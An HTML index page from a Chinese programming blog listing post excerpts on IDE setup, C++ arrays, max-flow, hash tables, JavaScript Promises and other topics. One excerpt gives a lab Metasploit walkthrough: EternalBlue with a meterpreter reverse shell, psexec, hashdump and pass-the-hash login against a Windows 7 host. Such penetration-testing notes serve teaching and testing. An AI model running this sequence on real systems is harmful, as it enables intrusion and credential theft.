<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.122.0">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程中国的博客">
		<meta property="og:title" content="编程中国的博客" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0016c8fb27c2b4d0682325709bafc92e/" rel="bookmark">
			解决IDEA中多个项目不在同一窗口下显示的问题(操作简单)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天博主在使用IDEA软件做练习的时候,想要重新new一个项目,一系列流程走完之后发现new的新项目出来了,但是之前的项目却不见了,或者在另外一个窗口,这个和eclipse不同,显示不太符合大家的编程习惯,网上搜索了一些资料,找到了解决的办法,现在分享给大家;
首先,如下图,我的IDEA界面上有一个项目(在大家new一个项目却发现新建项目出来了,但是原来项目不见了的前提下)
在这里我之前的项目名称是Array,我现在要操作的是把Array也放在这同一个窗口下和valid-parentheses一起显示:操作分为如下几步:
1.点击左上角的File-&gt;Project Structure
, 2.找到Modules 点击右上方的'+'号,选择Import Modules,如下图所示:
3.选择你需要显示在同一个窗口下的项目目录,我这里是Array：
4.然后选择下面的操作:
5.一系列的next之后 点击完成(如果提示overwriter的话 直接overwrite即可)
这样就ok了! 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d1529df1ee0012722a355f4641cfb2f/" rel="bookmark">
			C&#43;&#43; 定义数组 传递数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、静态内存分配： 在定义数组（必须指定数组的大小为一个常量或者常数），例如：
int array[10]; //或 const int Size=10; int array[Size]; 2、动态内存分配： 一维数组： c语言: //定义 int arraysize;//元素个数 printf("请输入数组的大小："); scanf("%d",&amp;arraysize); int *array;//指针指向数组 array=(int *)malloc(arraysize *sizeof(int));//动态内存分配 //释放 free(array); c++：
//定义 int arraysize;//元素个数 cout&lt;&lt;"请输入数组的大小："; cin&gt;&gt;arraysize; int *array;//指针指向数组 array=new int[arraysize]; //动态内存分配 //释放 delete []array; 二维数组 //定义 cin&gt;&gt;row &gt;&gt;col ; int **p2 ; p2 = new int*[row] ; for( i = 0 ; i &lt; row ; i ++ ) p2[i] = new int[col] ; //释放二维数组 for( i = 0 ; i &lt; row ; i ++ ) delete []p2[i] ; delete []p2 ; 三维数组 //定义 cout&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d1529df1ee0012722a355f4641cfb2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57262aff6b2fcee4cdc069826cdc32ce/" rel="bookmark">
			Metasploit之Hash值传递渗透
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 讲述Metasploit获取到hash值的渗透测试。
测试环境 目标机:
Windows 7 Ultimate 192.168.1.9 攻击机:
Linux 4.6.0-kali1-amd64 192.168.1.31 攻击机姿势(永恒之蓝)：
msfconsole use exploit/windows/smb/ms17_010_eternalblue set rhost 192.168.1.9 set payload windows/meterpreter/reverse_tcp set lhost 192.168.1.12 exploit 获得shell Metasploit之Hash值传递渗透
进入metasploit环境下进行操作 use exploit/windows/smb/psexec --&gt;使用这个渗透攻击模块 show options --&gt;查看配置选项 set RHOST 192.168.1.9 --&gt;设置攻击目标192.168.1.9 ，端口默认445 set SMBUser tdcoming --&gt;设置账号为 tdcoming exploit --&gt;执行攻击 成功后获得meterpreter的反弹连接 hashdump --&gt;获取hash值 使用hash值登陆 exit --&gt;从meterpreter的反弹连接中返回到“msf exploit(psexec)&gt;” set smbpass hash值 --&gt;设置hash值 exploit --&gt;再次登陆一遍 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f89be9539a6500e6d8679d59224eaa0c/" rel="bookmark">
			最大流之Ford-Fulkerson算法（C&#43;&#43;实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文主要讲解最大流问题的Ford-Fulkerson解法。可是说这是一种方法，而不是算法，因为它包含具有不同运行时间的几种实现。该方法依赖于三种重要思想：残留网络，增广路径和割。
一、残留网络 顾名思义，残留网络是指给定网络和一个流，其对应还可以容纳的流组成的网络。具体说来，就是假定一个网络G=（V，E），其源点s，汇点t。设f为G中的一个流，对应顶点u到顶点v的流。在不超过C（u，v）的条件下（C代表边容量），从u到v之间可以压入的额外网络流量，就是边（u，v）的残余容量（residual capacity），定义如下：
r（u，v）=c（u，v）-f（u，v）
举个例子，假设（u，v）当前流量为3/4，那么就是说c（u，v）=4，f（u，v）=3，那么r（u，v）=1。
我们知道，在网络流中还有这么一条规律。从u到v已经有了3个单位流量，那么从反方向上看，也就是从v到u就有了3个单位的残留网络，这时r（v，u）=3。可以这样理解，从u到v有3个单位流量，那么从v到u就有了将这3个单位流量的压回去的能力。
我们来具体看一个例子，如下图所示一个流网络
其对应的残留网络为：
二、增广路径 在了解了残留网络后，我们来介绍增广路径。已知一个流网络G和流f，增广路径p是其残留网络Gf中从s到t的一条简单路径。形象的理解为从s到t存在一条不违反边容量的路径，向这条路径压入流量，可以增加整个网络的流值。上面的残留网络中，存在这样一条增广路径：
其可以压入4个单位的流量，压入后，我们得到一个新的流网络，其流量比原来的流网络要多4。这时我们继续在新的流网络上用同样的方法寻找增广路径，直到找不到为止。这时我们就得到了一个最大的网络流。
三、流网络的割 上面仅仅是介绍了方法，可是怎么证明当无法再寻找到增广路径时，就证明当前网络是最大流网络呢？这就需要用到最大流最小割定理。
首先介绍下，割的概念。流网络G（V，E）的割（S，T）将V划分为S和T=V-S两部分，使得s属于S，t属于T。割（S，T）的容量是指从集合S到集合T的所有边（有方向）的容量之和（不算反方向的，必须是S-àT）。如果f是一个流，则穿过割（S，T）的净流量被定义为f（S，T）（包括反向的，SàT的为正值，T—&gt;S的负值）。将上面举的例子继续拿来，随便画一个割，如下图所示：
割的容量就是c(u,w)+c(v,x)=26
当前流网络的穿过割的净流量为f(u,w)+f(v,x)-f(w,v)=12+11-4=19
显然，我们有对任意一个割，穿过该割的净流量上界就是该割的容量，即不可能超过割的容量。所以网络的最大流必然无法超过网络的最小割。
可是，这跟残留网络上的增广路径有什么关系呢？
首先，我们必须了解一个特性，根据上一篇文章中讲到的最大流问题的线性规划表示时，提到，流网络的流量守恒的原则，根据这个原则我们可以知道，对网络的任意割，其净流量的都是相等的。具体证明是不难的，可以通过下图形象的理解下，
和上面的割相比，集合S中少了u和v，从源点s到集合T的净流量都流向了u和v，而在上一个割图中，集合S到集合T的流量是等于u和v到集合T的净流量的。其中w也有流流向了u和v，而这部分流无法流向源点s，因为没有路径，所以最后这部分流量加上s到u和v的流量，在u和v之间无论如何互相传递流，最终都要流向集合T，所以这个流量值是等于s流向u和v的值的。将s比喻成一个水龙头，u和v流向别处的水流，都是来自s的，其自身不可能创造水流。所以任意割的净流量都是相等的。
万事俱备，现在来证明当残留网络Gf中不包含增广路径时，f是G的最大流。
假设Gf中不包含增广路径，即Gf不包含从s到v的路径，定义S={v:Gf中从s到v存在一条通路}，也就是Gf中s能够有通路到达的点的集合，显然这个集合不包括t，因为s到t没有通路。这时，我们令T=V-S。那么（S，T）就是一个割。如下图所示：
那么，对于顶点u属于S，v属于T，有f（u，v）=c（u，v）。否则（u，v）就存在残余流量，因而s到u加上u到v就构成了一条s到v的通路，所以v就必须属于S，矛盾。因此这时就表明当前流f是等于当前的割的容量的，因此f就是最大流。
代码： main.cpp
// C++ program for implementation of Ford Fulkerson algorithm #include &lt;iostream&gt; #include &lt;limits.h&gt; #include &lt;string.h&gt; #include &lt;queue&gt; using namespace std; // Number of vertices in given graph #define V 6 /* Returns true if there is a path from source 's' to sink 't' in residual graph.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f89be9539a6500e6d8679d59224eaa0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cafbfae80df5aa181183a7a328a0373c/" rel="bookmark">
			python - 定时任务，每天定时备份数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、代码说话 # coding=utf-8 ... os.system('comand') 执行括号中的命令 os.path.exists 查看path是否存在 mysql命令 mysqldump -uusername -ppassword dbname &gt; dbname.sql 导出整个数据库 (导出过程会锁表) mysql命令 mysqldump --single-transaction -uusername -ppassword dbname &gt; dbname.sql 导出整个数据库 (innodb 导出过程不锁表) mysql命令 mysqldump --lock-tables=false -uusername -ppassword dbname &gt; dbname.sql 导出整个数据库 (myisam 导出过程不锁表) ... import os import time # from apscheduler.schedulers.blocking import BlockingScheduler DB_USER = 'root' DB_PASSWORD = '123456' DB_NAME = 'yourdbname' BACK_DIR = '/data/mysql/' TODAY = time.strftime('%Y-%m-%d') # -%H-%M-%S TODAY_DIR = BACK_DIR + TODAY def backupsql(): # 如果目录不存在，新建目录 if not os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cafbfae80df5aa181183a7a328a0373c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d1158023ee0ebdb31b94b2ccf414abd/" rel="bookmark">
			用WeUI 中的weui-tab 配合js实现weui-tab tabbar   页面切换切换功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图片路径：https://download.csdn.net/download/ypz131023/10825133；（需要的可以私聊给）
示例效果图
js代码块
test &lt;div class="weui-tab"&gt; &lt;div class="weui-tab__bd"&gt; &lt;div id="tab1" class="weui-tab__bd-item weui-tab__bd-item--active"&gt; &lt;div class="weui-search-bar" id="search_bar"&gt; &lt;form class="weui-search-bar__form"&gt; &lt;div class="weui-search-bar__box"&gt; &lt;i class="weui-icon-search"&gt;&lt;/i&gt; &lt;input type="search" class="weui-search-bar__input" id="search_input" placeholder="搜索" /&gt; &lt;a href="javascript:" class="weui-icon-clear" id="search_clear"&gt;&lt;/a&gt; &lt;/div&gt; &lt;label for="search_input" class="weui-search-bar__label" id="search_text"&gt; &lt;i class="weui-icon-search"&gt;&lt;/i&gt; &lt;span&gt;搜索&lt;/span&gt; &lt;/label&gt; &lt;/form&gt; &lt;a href="javascript:" class="weui-search-bar__cancel-btn" id="search_cancel"&gt;取消&lt;/a&gt; &lt;/div&gt; &lt;div class="weui-cells weui-cells_access search_show" id="search_show"&gt; &lt;div class="weui-cell"&gt; &lt;div class="weui-cell__bd weui-cell_primary"&gt; &lt;p&gt;智障&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="weui-cell"&gt; &lt;div class="weui-cell__bd weui-cell_primary"&gt; &lt;p&gt;傻子&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="weui-cell"&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d1158023ee0ebdb31b94b2ccf414abd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64af2d6678561ccf5d0fefe6e6dbff2c/" rel="bookmark">
			E-R图向关系模型的转换实例详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.实例1：将教学管理ER图转换为关系模式
(1)把三个实体类型转换成三个模式：
①系（系编号，系名，电话）
②教师（教工号，姓名，性别，职称）
③课程（课程号，课程名，学分）
(2)对于1:1联系“主管”，可以在“系”模式中加入教工号（教工号为外键）。对于1:N联系“聘任”，可以在“教师”模式中加入系编号（系编号为外键）。对于1:N联系“开设”，可以在“课程”模式中加入系编号（系编号为外键）。
①系（系编号，系名，电话，主管人的教工号）　②教师（教工号，姓名，性别，职称，系编号） ③课程（课程号，课程名，学分，系编号） (3)第三步：对于M:N联系“任教”，则生成一个新的关系模式：
①任教（教工号，课程号，教材）
(4)这样，转换成的四个关系模式如下：
①系（系编号，系名，电话，主管人的教工号）
②教师（教工号，姓名，性别，职称，系编号）
③课程（课程号，课程名，学分，系编号）
④任教（教工号，课程号，教材）
2.实例2：一元联系类型ER图结构转换为关系模式
(1)运动员名次之间存在着1:1联系
①运动员（编号，姓名，性别，名次，上一名次编号）
(2)职工之间存在上下级联系，即1:N联系
①职工（工号，姓名，年龄，性别，经理工号）
(3)工厂的零件之间存在着组合关系（M:N联系）
①零件（零件号，零件名，规格）
②组成（零件号，子零件号，数量）
3.实例3：三元联系的ER图结构转换为关系模式 ①仓库（仓库号，仓库名，地址）
②商店（商店号，商店名）
③商品（商品号，商品名）
④进货（商店号，商品号，仓库号，日期，数量）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f9a646f0964f3653390646bca23f55a/" rel="bookmark">
			c# Asp:DropDownList 增加属性AutoPostBack=&#34;true&#34;后，页面不断刷新的原因。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在使用 Asp:DropDownList控件时，想要做一个绑定数据功能，且要有OnSelectedIndexChanged事件，需要增加属性AutoPostBack="true"，否则OnSelectedIndexChanged事件触发不了。
aspx内容： &lt;tr&gt; &lt;td style=" width:8%"&gt;数据库IP：&lt;/td&gt; &lt;td&gt;&lt;asp:DropDownList ID="ddl_db" runat="server" Width="100px" AutoPostBack="true" OnSelectedIndexChanged="ddl_db_SelectedIndexChanged"/&gt; &lt;/td&gt; &lt;/tr&gt; 后台内容：
protected void Page_Load(object sender, EventArgs e) { AjaxPro.Utility.RegisterTypeForAjax(typeof(BackstageMgt_Admin_Report_Mileage)); if (!IsPostBack) { //默认一天，提高页面载入速度 txt_beginTime.Text = DateTime.Now.AddDays(-7).ToString("yyyy-MM-dd"); txt_endTime.Text = DateTime.Now.ToString("yyyy-MM-dd"); dbs = LoginDB.getModelList(""); foreach (LoginDB db in dbs) { this.ddl_db.Items.Add(new ListItem(db.Source, db.db_id.ToString())); } this.ddl_db.SelectedIndex = 0; .... } } 但是我加上这个属性后，发现页面一直在刷新，把这个属性去掉，则就不刷新了。后来试了把后台Page_load中ddl_db相关代码去掉，也不会刷新。
再后来试了一下把第一行的AjaxPro.Utility.RegisterTypeForAjax(typeof(BackstageMgt_Admin_Report_Mileage));注释了，也不会刷新。
现在问题是找到了。还没有深入研究出现的原因。如果你有想法请不吝赐教！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4382ec996b5f512e526e1661136c91ca/" rel="bookmark">
			C&#43;&#43;    C2678  二进制“小于” 没有找到接受“const XXX”类型的左操作数的运算符(或没有可接受的转换)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景描述： 环境：VS2015
自定义Persion类，然后使用map存储，编译报错，
C2678 二进制“&lt;”: 没有找到接受“const Persion”类型的左操作数的运算符(或没有可接受的转换)
代码如下：
#include&lt;iostream&gt;
#include&lt;map&gt;
using namespace std;
class Persion
{
public:
Persion(string name,string address):m_name(name),m_address(address) {};
private:
string m_name;
string m_address;
};
int main()
{
Persion li("li", "中国");
Persion marry("marry", "美国");
map&lt;Persion, string&gt; info;
info.insert(pair&lt;Persion,string&gt;(li,"one"));
info.insert(pair&lt;Persion, string&gt;(marry, "two"));
return 0;
}
原因： map&lt;class a,class b&gt;存储数据时，会根据类a中的operator&lt;() 排序，如果该类没有定义这个函数，就会报错。
解决办法：Persion类添加函数
bool operator&lt; (const Persion &amp;other) const
{
return m_name &lt;other.m_name;
}
技巧：通常把基本类型int,double,string,vector等放在左边，方便map进行排序。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1deadd8eedfaa6f394e6216a52868c8/" rel="bookmark">
			哈希表（C&#43;&#43;实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于Hash Table， 总结如下：
散列表能够实现通过key 对元素的快速访问。 而且易于扩展。 对元素能够实现快速访问（搜索等字典操作）， 这是Hash Table 较之于链表的优势所在， 二者均易于扩展。 而易于扩展这个dynamic的结构（使用链接法的时候）又是较之于array的优势所在。 因为数组时不易于扩展的。 使用散列表， 我们需要使用Hash function。 散列函数是对关键字和散列表元提供映射的函数。 常见的Hash function 有如下几种：
（1）直接寻址法。 取关键字或关键字的某个线性函数值为散列地址。即H(key)=key或H(key) = a•key + b，其中a和b为常数（这种散列函数叫做自身函数）
（2）除法散列法， 关键字k 除以m 取余数， 将关键字k 映射到m个slots 中的一个上， 即 h(k) = k mod m， 一般取m 为素数。
（3）乘法散列法： 包含两步：
step 1:用关键字k 乘上常数A（0&lt;A &lt;1）, 并提取kA d的小数部分。
step 2: 用m 乘以这个小数部分的值， 再往下取整，
总之， 散列函数为： h(k) = floor(m(kA mod 1))。 乘法散列的好处就是m 可以是2的某个次幂。 而不只是素数了。
（4） 折叠法： 将关键字分割成位数相同的几部分（最后一部分的位数可以不同），然后取这几部分的叠加和（舍去进位）作为哈希地址。
等等还有好多散列函数。
散列函数的性能直接影响着散列表数据结构的性能。 当散列函数把太少或太多关键字映射到单个散列表元上时，散列表的使用效率会大大降低。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1deadd8eedfaa6f394e6216a52868c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17193eb11f91f95419573e5ec285bc1d/" rel="bookmark">
			advanced installer详细做包教程：预安装，开机自启等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打包步骤：（版本16.3） 1.打开之后新建： 选择专业版，选择模板。这里我个人也快忘了，选择32/64混合包使用的大概。新建向导之后可以创建一个项目，主界面信息如下：
名称和图标等信息可以进行填写。
2.添加基础的文件信息 (1)导入安装包的文件目录：
首先右键，添加应用程序文件夹
(2)添加桌面快捷方式：
接着新建默认的快捷方式：
新建成功后，拖放 到你想要放置的位置：
桌面Desktop:就是安装界面放到桌面。
放到了开机的启动菜单 Start Menu，开机之后会自动启动。
最后一步， 双击打开[SHORTCUTDIR]：
跳出对话框-点击文件夹：
1.修改名称
2.添加快捷方式的目标：
3.修改工作目录：
完成。
拓展一：
覆盖安装：如果在上面并没有创建控制面板注册，每次安装默认是不会覆盖重复文件的，想要覆盖就需要右键文件夹属性：
拓展二：
文件关联：
文件关联使用的是新建文件关联按钮！ 工具栏的向导注意使用！很好用，给定文件后缀名加上对应的应用程序即可。
拓展三：
安装路径： 拓展四：
用户界面： 自行尝试，酷炫界面自己来！自定义行为有许多高端操作的样子。
对了，在对话框Tab下，你可以选择ExitDialog进行设置是否在安装之后自动运行程序功能！
拓展五：
在线升级： 该功能最好去看官方文档，这里简单介绍一下该功能：
第一个包肯定是不能在线升级的，这里要在里面填写好信息：
具体升级：
不具体写了，比较麻烦，主要思路就是：
1.将最新的exe路径和版本信息等以固定的格式放在网上
2.绿色包也要放在网上
3.调用安装后在软件根目录的updater.exe进行检查下载。
这一套都是该软件做好的，我们提供网上资源和资源信息就好了。补丁包会更加麻烦一些，需要做msi包，进行本版本和下一版本比较生成补丁文件~
注 问题分析：
问题1.注意如果项目中包含Ini或者xml文件，且其中有中文，再导入安装之后之后会出现中文不见了的问题！
解决：将设置下的自动导入功能中的xml和ini后面的东西删除，这样就把Ini文件当做普通文件，不会做任何修改了！
问题2：双击文件不打开项目，而是显示正在配置，要给你卸载
解决：查到了有一个无用的.rtc文件，删除了就不能使用双击打开，即文件关联的功能。有可能还有其他可能，总体是因为该软件检测到安装的文件缺失导致卸载重装的问题。但是这并不能根本解决问题。直接关闭该检测功能即可:https://blog.csdn.net/qq_37887537/article/details/107104376
推荐：
https://blog.csdn.net/ryu2003/article/details/51470894：Advanced Installer 安装前卸载旧版本的办法
https://blog.csdn.net/qq_41332396/article/details/83211351：Advanced Installer升级功能
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4de5ef0df7b23744ea432b9abddffde4/" rel="bookmark">
			使用NLTK找出所有的语法解析树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用NLTK完成Udacity公开课CS271（Intro to Artificial Intelligence）的Final Assessment Question 20
首先我们按照题目要求编写语法规则final_question_20.fcfg
% start S S[SEM=(?np + ?vp)] -&gt; NP[SEM=?np] VP[SEM=?vp] S[SEM=(?s1 + and + ?s2)] -&gt; S[SEM=?s1] 'and' S[SEM=?s2] NP[SEM=?n] -&gt; N[SEM=?n] NP[SEM=(?d + ?n)] -&gt; D[SEM=?d] N[SEM=?n] NP[SEM=(?adj + ?n)] -&gt; ADJ[SEM=?adj] N[SEM=?n] NP[SEM=(?d + ?adj + ?n)] -&gt; D[SEM=?d] ADJ[SEM=?adj] N[SEM=?n] VP[SEM=(?v + ?np)] -&gt; V[SEM=?v] NP[SEM=?np] VP[SEM=?v] -&gt; V[SEM=?v] VP[SEM=(?v + ?np + ?np)] -&gt; V[SEM=?v] NP[SEM=?np] NP[SEM=?np] N[SEM='fall'] -&gt; 'fall' N[SEM='spring'] -&gt; 'spring' N[SEM='leaves'] -&gt; 'leaves' N[SEM='dog'] -&gt; 'dog' N[SEM='cat'] -&gt; 'cat' V[SEM='spring'] -&gt; 'spring' V[SEM='leaves'] -&gt; 'leaves' V[SEM='fall'] -&gt; 'fall' V[SEM='left'] -&gt; 'left' D[SEM='the'] -&gt; 'the' ADJ[SEM='fall'] -&gt; 'fall' ADJ[SEM='spring'] -&gt; 'spring' ADJ[SEM='purple'] -&gt; 'purple' ADJ[SEM='left'] -&gt; 'left' 然后使用nltk对这些句子进行语法树解析，打印最终语法树列表的长度即可：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4de5ef0df7b23744ea432b9abddffde4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42b09eca4f6b9ae3d6ccc6f0fab246e0/" rel="bookmark">
			一个请求结束之后再发送另外一个请求，需要连着发很多请求的方法-promise
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前用vue写了一个表格组件，一个页面最多会循环出来20个表格，每个表格都有会发请求，差不多20个请求一起发出，数据库不干了，所以就想在一个表格请求完再请求下一个表格。
这就用了传说中的promise，前面稍微解释一下promise，后面直接贴代码
Promise其实是一个构造函数，自带有all、reject、resolve这几个方法，用的时候有then、catch这俩方法
一、先来new一个 var p = new Promise(function(resolve, reject){ //做一些异步操作（可以是一个post请求） setTimeout(function(){ console.log('执行！'); resolve('数据'); }, 2000); }); Promise的构造函数接收一个参数，是函数，并且传入两个参数：resolve，reject，分别表示异步操作执行成功后的回调函数和异步操作执行失败后的回调函数。其实这里用“成功”和“失败”来描述并不准确，按照标准来讲，resolve是将Promise的状态置为fullfiled，reject是将Promise的状态置为rejected，现在不用太纠结这个
运行，两秒之后输出“执行！”，并没用调用，new以后就自动执行了，所以promise需要包在函数里，需要的时候再调用
function runAsync(){ var p = new Promise(function(resolve, reject){ //做一些异步操作 setTimeout(function(){ console.log('执行！'); resolve('数据'); }, 2000); }); return p; } runAsync() 包装好之后，还是不知道怎么实现最初的需求，而且resolve(‘数据’);不知道什么意思
包装好的函数最后，会return出Promise对象，也就是说，执行这个函数我们得到了一个Promise对象。还记得Promise对象上有then、catch方法吧？这就是强大之处了
二、来调用一下 runAsync().then(function(data){ console.log(data); //这里的data，就是刚刚resolve('数据');括号里传过来的东西 //后面可以用传过来的数据做些其他操作 //...... }); 运行，会输出“执行！”，接着输出“数据”
所以能看出来，then其实就是我们在promise的异步操作的回调，现在就是把异步操作和回调分开写了，在一步操作之后，链式执行回调。这个时候会有疑问，不用promise，直接在setTimeout里调用runAsync().then里的函数不就好了，所以就用到了promise的最厉害的链式操作
runAsync1() .then(function(data){ console.log(data); return runAsync2(); }) .then(function(data){ console.log(data); return runAsync3(); }) .then(function(data){ console.log(data); }); runAsync1、runAsync2、runAsync3这三个函数都是如何定义的？
function runAsync1(){ var p = new Promise(function(resolve, reject){ //做一些异步操作 setTimeout(function(){ console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42b09eca4f6b9ae3d6ccc6f0fab246e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67bc28e0991b6728118f24fe5baf7dd4/" rel="bookmark">
			深圳道乐公司笔试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、JS执行过程
js执行就是先语法分析，然后预编译，预编译会生成AO对象，也就是执行上下文，然后再执行。
2、px、em、rem、vh 1rem = 16px;
px是相对于显示器屏幕分辨率的长度单位。
em是相对于当前对象的字体尺寸。
rem是相对于HTML根元素的字体尺寸。
vh是相对于视口高度的单位。
3、css3媒体查询:根据用户所使用的设备或显示器特性来自定义样式
@media screen and (max-width:600px){ body{ font-size:88%; } #content-main{ float:none; width:100%; } }
4、h5语义化标签的作用：有利于seo搜索引擎优化
5、[1&lt;2&lt;3,3&lt;2&lt;1] =&gt; [true,true]
6、"1 2 3".replace(/\d/g,parseInt`) =&gt; 1 2 3
7、parseInt(3,8) =&gt; 3 parseInt(3,2) =&gt; NAN parseInt(3,0) =&gt; NAN或3 parseInt(" 12 34 ") =&gt; 12
8、不属于document：a、focus b、getElementById c、querySelector d、bgColor
d
9、Canvas getContext()
10、slice 截取 concat 拼接 join 组成字符串 这三种方法不会改变原数组
splice（第几位，删除几个元素，用什么替代）
11、vue的computed,如何改变数组中的元素
12、多行文本垂直居中
&lt;div&gt; &lt;span&gt; &lt;p&gt;&lt;/p&gt; &lt;/span&gt; &lt;/div&gt; div{ display:table; } div span{ display:table-cell; vertical-align:middle; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/621460349f455aa1bc68a227b1af3a51/" rel="bookmark">
			Apizza在chrome上安装apizzaSQ扩展
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信很多初次使用Apizza的朋友，开始使用，都无法正常使用其最核心的功能，模拟发送http请求，那是因为你的浏览器缺少了apizzaSQ这个chrome浏览器插件。
下面是Apizza给出的解决方案；
我们选择源码安装，进行演示操作一下；
源码文件下载地址：
http://cdn.apizza.cc/apizzaSQ-pro-v1.0.3.zip
下载后得到的压缩文件：
进行解压
然后，打开chrome，找到“更多工具-扩展”，右上角开启“开发者模式”；点击“加载已解压的扩展程序”按钮
选择刚才解压的文件，即可。
具体参考百度文档：https://jingyan.baidu.com/album/ceb9fb108bad968cad2ba0f0.html?picindex=3
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/def2d82d04f0eb3f4f13d3940d60200d/" rel="bookmark">
			优先队列（C&#43;&#43;自实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		优先队列（堆）满足先进先出，而且每次出队的都是队列中最小的（也可以是最大的，看实现过程）。
堆是一棵完全二叉树，所以优先队列一般用二叉堆实现。
分析：
1.一棵完全二叉树，所以可以用一个数组表示而不需要用指针。但是用数组就要事先估计堆的大小，所以用一个Capacity表示最大值。
2.因为保持堆序性质，最小元就是在根上，删除后还得做一些调整来保持完全二叉树的结构（实际就是删除最后一个元素，然后把它插入到队列中）。
3.若当前节点下标为i，则i2和i2+1就是它的左右孩子，我们在data[0]处放了一个MIN_INT。
4.入队：首先size++，如果data[size]插入不破坏结构，结束。否则，不断用父亲的值赋给当前节点，直到合适的位置。时间复杂度O(logN)。
5.出队：首先根节点置空，记录size点（last）的值然后size–，last能放入当前空穴就结束，否则，不断用儿子中最小的值赋给当前节点。时间复杂度O(logN)。（注释： 入队和出队的调整是一个逆向对称的过程）
6.队首：直接返回根节点的值，为最小值，O(1)。
代码：
PriorityQueue.h
#ifndef PRIORITYQUEUE_H #define PRIORITYQUEUE_H template&lt;class T&gt; class PriorityQueue { private: int Capacity = 100; //队列容量 int size; //队列大小 T* data; //队列变量 public: PriorityQueue(); ~PriorityQueue(); int Size(); bool Full(); //判满 bool Empty(); //判空 void Push(T key); //入队 void Pop(); //出队 void Clear(); //清空 T Top(); //队首 }; template&lt;class T&gt; PriorityQueue&lt;T&gt;::PriorityQueue() { data = (T*) malloc((Capacity + 1)*sizeof(T)); if(!data) { perror("
	</div>
	<div class="list__footer clearfix">
